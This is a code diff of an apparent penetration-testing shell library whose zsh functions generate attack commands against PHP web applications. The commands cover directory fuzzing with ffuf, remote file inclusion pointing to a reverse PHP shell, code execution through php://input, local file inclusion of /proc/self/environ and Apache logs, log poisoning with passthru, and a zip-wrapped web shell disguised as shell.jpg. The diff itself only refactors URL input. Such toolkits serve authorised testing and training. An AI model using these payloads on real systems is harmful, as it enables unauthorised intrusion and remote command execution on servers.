@@ -5,53 +5,50 @@
 #############################################################
 
 qq-enum-web-php-ffuf-raft() {
-    local u && read "u?URL: "
-    local d=$(echo "${u}" | cut -d/ -f3)
-    print -z "ffuf -v -p 0.1 -t 10 -fc 404 -w ${__WORDS_RAFT_FILES} -u ${u}/FUZZ -e ${__EXT_PHP}"
+    __GET-URL
+    print -z "ffuf -v -p 0.1 -t 10 -fc 404 -w ${__WORDS_RAFT_FILES} -u ${__URL}/FUZZ -e ${__EXT_PHP}"
 }
 
 qq-enum-web-php-ffuf-common-php() {
-    local u && read "u?URL: "
-    local d=$(echo "${u}" | cut -d/ -f3)
-    print -z "ffuf -v -p 0.1 -t 10 -fc 404 -w ${__WORDS_PHP_COMMON} -u ${u}/FUZZ"
+    __GET-URL
+    print -z "ffuf -v -p 0.1 -t 10 -fc 404 -w /usr/share/seclists/Discovery/Web-Content/Common-PHP-Filenames.txt -u ${__URL}/FUZZ"
 }
 
 qq-enum-web-php-ffuf-php-fuzz() {
-    local u && read "u?URL: "
-    local d=$(echo "${u}" | cut -d/ -f3)
-    print -z "ffuf -v -p 0.1 -t 10 -fc 404 -w ${__WORDS_PHP_FUZZ} -u ${u}FUZZ "
+    __GET-URL
+    print -z "ffuf -v -p 0.1 -t 10 -fc 404 -w /usr/share/seclists/Discovery/Web-Content/PHP.fuzz.txt -u ${__URL}FUZZ "
 }
 
 qq-enum-web-php-rfi() {
-    __warn "TARGET URL should contain /page.php?rfi="
+    __warn "URL should contain /page.php?rfi="
     __warn "PAYLOAD URL should contain reverse php shell"
-    local u && read "u?TARGET URL: "
+    __GET-URL
     local p && read "p?PAYLOAD URL: "
-    print -z "curl -k -v -XGET \"${u}${p}%00\" "
+    print -z "curl -k -v -XGET \"${__URL}${p}%00\" "
 }
 
 qq-enum-web-php-rfi-php-input() {
-    __warn "TARGET URL should contain /page.php?rfi="
-    local u && read "u?TARGET URL: "
-    print -z "curl -k -v -XPOST --data \"<?php echo shell_exec('whoami'); ?>\"  \"${u}php://input%00\" "
+    __warn "URL should contain /page.php?rfi="
+    __GET-URL
+    print -z "curl -k -v -XPOST --data \"<?php echo shell_exec('whoami'); ?>\"  \"${__URL}php://input%00\" "
 }
 
 qq-enum-web-php-lfi-proc-self-environ() {
-    __warn "TARGET URL should contain /page.php?lfi="
-    local u && read "u?TARGET URL: "
-    print -z "curl -k -v -A '<?=phpinfo(); ?>' ${u}../../../proc/self/environ "
+    __warn "URL should contain /page.php?lfi="
+    __GET-URL
+    print -z "curl -k -v -A '<?=phpinfo(); ?>' ${__URL}../../../proc/self/environ "
 }
 
 qq-enum-web-php-lfi-filter-resource(){
-    __warn "TARGET URL should contain /page.php?lfi="
-    local u && read "u?TARGET URL: "
+    __warn "URL should contain /page.php?lfi="
+    __GET-URL
     local f && read "f?RFILE: "
-    print -z "curl -k -v -XGET ${u}php://filter/convert.base64-encode/resource=${f} "
+    print -z "curl -k -v -XGET ${__URL}php://filter/convert.base64-encode/resource=${f} "
 }
 
 qq-enum-web-php-lfi-zip-jpg-shell() {
-    __warn "TARGET URL should contain /page.php?lfi="
-    local u && read "u?TARGET URL: "
+    __warn "URL should contain /page.php?lfi="
+    __GET-URL
 
     echo "<pre><?php system(\$_GET['cmd']); ?></pre>" > payload.php
     zip payload.zip payload.php
@@ -59,17 +56,17 @@ qq-enum-web-php-lfi-zip-jpg-shell() {
 
     __info "Created shell.jpg"
     __warn "First upload shell.jpg to target"
-    
-    print -z "curl -k -v -XGET ${u}zip://shell.jpg%23payload.php?cmd="
+
+    print -z "curl -k -v -XGET ${__URL}zip://shell.jpg%23payload.php?cmd="
 }
 
 qq-enum-web-php-lfi-logfile() {
-    __warn "TARGET URL should contain /page.php?lfi="
-    local u && read "u?TARGET URL: "
+    __warn "URL should contain /page.php?lfi="
+    __GET-URL
     local b && read "b?BASE URL: "
     curl -s "${b}/<?php passthru(\$_GET['cmd']); ?>"
     __info "lfi request completed"
-    print -z "curl -k -v ${u}../../../../../var/log/apache2/access.log&cmd=whoami"
+    print -z "curl -k -v ${__URL}../../../../../var/log/apache2/access.log&cmd=whoami"
 }
 
 qq-enum-web-php-gen-htaccess() {
